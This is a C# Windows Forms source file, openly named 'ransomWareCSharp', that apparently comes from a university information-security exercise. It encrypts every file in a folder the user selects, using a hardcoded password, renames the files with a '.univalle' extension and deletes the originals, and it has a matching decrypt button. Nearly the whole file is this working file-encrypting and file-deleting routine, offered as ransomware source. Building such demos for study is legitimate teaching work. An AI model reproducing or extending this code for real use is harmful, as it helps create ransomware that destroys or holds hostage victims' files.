using EncryptDoc;
namespace ransomWareCSharp
{
    public partial class Principal : Form
    {
        private TextBox txtCarpeta = new();
        private Label lblTxtCarpeta = new();
        private Button btnBuscarCarpeta = new();
        private Button btnEncriptar = new();
        private Button btnDesencriptar = new();

        public Principal()
        {
            SuspendLayout();
            Text = "Principal";
            ClientSize = new Size(400, 300);
            MaximizeBox = false;
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.FixedToolWindow;
            Load += FormLoad;

            //Controles
            lblTxtCarpeta.Name = "lblTxtCarpeta";
            lblTxtCarpeta.Text = "Buscar Carpeta";
            lblTxtCarpeta.Location = new Point(10, 10);
            lblTxtCarpeta.ForeColor = Color.Blue;
            Controls.Add(lblTxtCarpeta);

            txtCarpeta.Location = new Point(10, 35);
            txtCarpeta.Size = new Size(350, 30);
            txtCarpeta.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            txtCarpeta.Name = "txtCarpeta";
            Controls.Add(txtCarpeta);

            btnBuscarCarpeta.Text = "Buscar";
            btnBuscarCarpeta.Name = "btnBuscar";
            btnBuscarCarpeta.Location = new Point(10, 65);
            btnBuscarCarpeta.Size = new Size(110, 40);
            btnBuscarCarpeta.Click += Click_btnBuscarCarpeta;
            Controls.Add(btnBuscarCarpeta);

            btnEncriptar.Text = "Encriptar";
            btnEncriptar.Name = "btnEncriptar";
            btnEncriptar.Location = new Point(120, 65);
            btnEncriptar.Size = new Size(110, 40);
            btnEncriptar.Click += Click_btnEncriptar;
            Controls.Add(btnEncriptar);

            btnDesencriptar.Text = "Desencriptar";
            btnDesencriptar.Name = "btnDesencriptar";
            btnDesencriptar.Location = new Point(230, 65);
            btnDesencriptar.Size = new Size(110, 40);
            btnDesencriptar.Click += Click_btnDesencriptar;
            Controls.Add(btnDesencriptar);

            ResumeLayout(false);
            PerformLayout();

        }

        private void FormLoad(object? sender, EventArgs e)
        {

        }
        private void Click_btnBuscarCarpeta(object? sender, EventArgs e)
        {
            FolderBrowserDialog folderBrowserDialog = new();
            DialogResult result = folderBrowserDialog.ShowDialog();
            txtCarpeta.Text = folderBrowserDialog.SelectedPath;
        }
        private void Click_btnEncriptar(object? sender, EventArgs e)
        {
            string carpeta = txtCarpeta.Text;
            try
            {
                if (Directory.Exists(carpeta))
                {
                    // Obtener una matriz de nombres de archivo en la carpeta
                    string[] archivos = Directory.GetFiles(carpeta);

                    foreach (string archivo in archivos)
                    {
                        Encrypt.EncryptFile(archivo, archivo + ".univalle", "#SeguridadInformaticaUnivalle");
                        File.Delete(archivo);
                    }
                }
                else
                {
                    MessageBox.Show("La carpeta especificada no existe.");
                }
            }
            catch (Exception error)
            {
                MessageBox.Show(error.Message);
            }

        }
        private void Click_btnDesencriptar(object? sender, EventArgs e)
        {
            string carpeta = txtCarpeta.Text;
            try
            {
                if (Directory.Exists(carpeta))
                {
                    // Obtener una matriz de nombres de archivo en la carpeta
                    string[] archivos = Directory.GetFiles(carpeta);

                    foreach (string archivo in archivos)
                    {
                        string ArchivoSinExtension = Path.GetFileNameWithoutExtension(archivo);
                        Encrypt.DecryptFile(archivo,Path.Combine(carpeta,ArchivoSinExtension) , "#SeguridadInformaticaUnivalle");
                        File.Delete(archivo);
                    }
                }
                else
                {
                    MessageBox.Show("La carpeta especificada no existe.");
                }
            }
            catch (Exception error)
            {
                MessageBox.Show(error.Message);
            }
        }

    }
}